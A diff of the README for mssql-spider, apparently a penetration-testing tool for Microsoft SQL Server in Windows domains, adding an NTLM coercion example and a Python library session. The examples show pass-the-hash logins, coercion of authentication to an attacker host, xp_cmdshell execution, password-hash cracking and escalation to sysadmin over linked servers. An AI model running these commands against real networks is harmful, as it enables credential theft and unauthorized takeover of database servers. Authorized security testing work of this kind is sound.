@@ -37,6 +37,12 @@ This does not require privileged access.
 mssql-spider -d corp.local -u jdoe -H :b9f917853e3dbf6e6831ecce60725930 --coerce-dirtree '\\attacker.corp.local\test' ./mssql-servers.txt
 ~~~
 
+Alternatively coerce NTLM with `xp_fileexist`.
+
+~~~ bash
+mssql-spider -d corp.local -u jdoe -H :b9f917853e3dbf6e6831ecce60725930 --coerce-fileexist '\\attacker.corp.local\test\test.txt' ./mssql-servers.txt
+~~~
+
 Authenticate via Kerberos and execute a command trough `xp_cmdshell` on all hosts where you can obtain sysadmin privileges.
 
 ~~~ bash
@@ -69,7 +75,7 @@ authentication:
   -D NAME, --database NAME
 
 enumeration:
-  -q SQL, --query SQL                                     execute SQL statement, unprivileged
+  -q SQL, --query SQL                                     execute SQL statement, unprivileged, repeatable
   --sysinfo                                               retrieve database and OS version, unprivileged
 
 coercion:
@@ -78,8 +84,8 @@ coercion:
   --coerce-openrowset UNCPATH                             coerce NTLM trough openrowset(), privileged
 
 filesystem:
-  --fs-read REMOTE                                        read file trough openrowset(), privileged
-  --fs-write LOCAL REMOTE                                 write file trough OLE automation, privileged
+  --file-read REMOTE                                      read file trough openrowset(), privileged
+  --file-write LOCAL REMOTE                               write file trough OLE automation, privileged
 
 execution:
   -x COMMAND, --exec-cmdshell COMMAND                     execute command trough xp_cmdshell(), privileged
@@ -101,4 +107,18 @@ Dumped database password hashes can be cracked with [hashcat](https://github.com
 
 ~~~ bash
 hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
+~~~
+
+## Usage as library
+
+~~~
+❯ python3
+>>> from mssql_spider.client import MSSQLClient
+>>> client = MSSQLClient.connect('192.168.118.140', 1433)
+>>> client.login(username='webapp11', password='redacted', windows_auth=False)
+>>> client.enum_links()
+{'SQL11\\SQLEXPRESS': {'local_login': 'NULL', 'remote_login': 'NULL'}, 'SQL27': {'local_login': 'webapp11', 'remote_login': 'webappGroup'}, 'SQL53': {'local_login': 'webapp11', 'remote_login': 'testAccount'}}
+>>> linked_instance = client.use_link('SQL27')
+>>> linked_instance.whoami()
+{'host': 'sql27', 'login': 'sa', 'user': 'dbo', 'roles': {'db_denydatareader', 'dbcreator', 'db_datareader', 'public', 'db_denydatawriter', 'db_accessadmin', 'setupadmin', 'serveradmin', 'db_backupoperator', 'diskadmin', 'bulkadmin', 'db_owner', 'securityadmin', 'sysadmin', 'db_datawriter', 'processadmin', 'db_ddladmin', 'db_securityadmin'}}
 ~~~
